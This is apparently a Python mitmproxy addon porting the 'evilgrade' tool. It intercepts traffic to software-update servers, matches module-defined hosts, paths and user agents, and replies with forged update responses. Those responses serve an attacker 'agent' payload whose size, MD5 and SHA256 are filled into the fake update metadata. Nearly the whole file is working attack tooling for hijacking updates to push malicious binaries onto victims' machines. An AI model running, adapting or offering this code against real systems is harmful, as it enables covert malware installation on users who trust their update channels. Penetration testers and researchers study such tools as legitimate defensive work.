#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import re
import sys
import ast
import random
import string
import fnmatch
import hashlib
import mitmproxy
try:
    from mitmproxy import http
except ImportError:
    from mitmproxy.models import http
from modules import ModuleBase


parse_host_header = re.compile(r"^(?P<host>[^:]+|\[.+\])(?::(?P<port>\d+))?$")


def rand_num(length, charset=string.digits):
    return _random(length, charset)


def rand_alpha(length, charset=string.letters):
    return _random(length, charset)


def _random(length, charset):
    return ''.join(random.choice(charset) for i in xrange(int(length)))


def log(msg):
    mitmproxy.ctx.log(msg)


class EvilGrade(object):
    config_filename = 'config.json'

    def __init__(self):
        self.config = self._load_config(self.config_filename)
        self.modules = self.load_modules(self.config.get('module_path'))
        log("[+] Loaded %d modules" % len(self.modules)) 

    def _load_config(self, config_filename):
        return {'module_path': './modules'}

    def check_module(self, module):
        agent = self.get_agent(module.agent_filename)
        if not agent:
            log("[!] %s agent (%s) does not exist. " % (module.name, module.agent_filename))
            return None

        md5 = hashlib.md5(agent)
        sha256 = hashlib.sha256(agent)
        module.options.update({
            'url_file': {'val': ''},
            'url_file_ext': {'val': ''},
            'agentsize': {'val': len(agent)},
            'agentmd5': {'val': md5.hexdigest()},
            'agentsha256': {'val': sha256.hexdigest()},
        })

        for req in module.requests:
            if req['type'] == 'file':
                file_name = os.path.realpath(req['file'])
                try:
                    open(file_name, 'r').close()
                except IOError:
                    log("[!] %s file (%s) does not exist. " % (module.name, file_name))
                    return None
        return module        

    def load_modules(self, module_path):
        module_path = os.path.realpath(module_path)
        module_files = [_[:-3] for _ in os.listdir(module_path) if _.endswith(".py")]
        sys.path.insert(0, module_path)
        for module in module_files:
            try:
                mod = __import__(module)
            except ImportError, e:
                log("Import Error: %s" % module)

        modules = []
        for module in ModuleBase.__subclasses__():
            if not module.enabled:
                continue
            module = self.check_module(module)
            if module:
                modules.append(module)
        return modules

    # TODO(gerry): Allow for dynamic agent creation
    def get_agent(self, agent_filename):
        # if re.search('^\[([\w\W]+)\]', agent_file):
            # eval(agent_file_matches)    
            # $cmd =~ /\<\%OUT\%\>([\w\W]+)\<\%OUT\%\>/;    #get output file
            # my $out = $1;                                 #output file
        agent_filename = os.path.realpath(agent_filename)
        try:
            agent_data = open(agent_filename, 'rb').read()
        except Exception, e:
            log("%s does not exist" % agent_filename)
            return None
        return agent_data

    def parse_data(self, data, module):
        for opt_name, option in module.options.iteritems():
            opt_name = opt_name.upper()
            if opt_name == "AGENT":
                continue
            val = option.get('val')
            if option.get('dynamic', 0):
                val = eval(val)
            data = re.sub('<%%%s%%>' % opt_name, str(val), data)
        return data

    def request(self, flow):
        if flow.client_conn.ssl_established:
            flow.request.scheme = "https"
            sni = flow.client_conn.connection.get_servername()
            port = 443
        else:
            flow.request.scheme = "http"
            sni = None
            port = 80

        host_header = flow.request.pretty_host
        m = parse_host_header.match(host_header)
        if m:
            host_header = m.group("host").strip("[]")
            if m.group("port"):
                port = int(m.group("port"))

        flow.request.host = sni or host_header
        flow.request.port = port

        for module in self.modules:
            if not re.search(module.vh, flow.request.host):
                continue

            for req in module.requests:
                if req.get('useragent', '') and not re.search(req.get('useragent'), flow.request.headers.get('User-Agent')):
                    continue

                if not re.search(req.get('path'), flow.request.path):
                    continue

                if req.get('method', '') and not flow.request.method == req.get('method'):
                    continue

                log("Found match! %s" % module.name)

                url_file, url_file_ext = os.path.splitext(os.path.basename(flow.request.path))
                module.options['url_file']['val'] = url_file
                module.options['url_file_ext']['val'] = url_file_ext
                
                status, data, headers = 200, '', req.get('headers', {})
                if req['type'] == 'redirect':
                    status, data, headers = 302, '', {"Location": req['location']}
                elif req['type'] in ['string', 'install']:
                    data = req['string']
                    if int(req['parse']) == 1:
                        data = self.parse_data(data, module)
                else:
                    if req['type'] == 'file':
                        file_name = req['file']
                    elif req['type'] == 'agent':
                        file_name = module.agent_filename
                    else:
                        log('Unknown request type (%s) for %s' % (req['type'], module.name))
                        continue

                    data = self.get_agent(file_name)
                    if int(req['parse']) == 1:
                        data = self.parse_data(data, module)
                flow.response = http.HTTPResponse.make(status, data, headers)
                module.options['brequest'] = {'val': flow.request.path + str(1)}

def start():
    return EvilGrade()
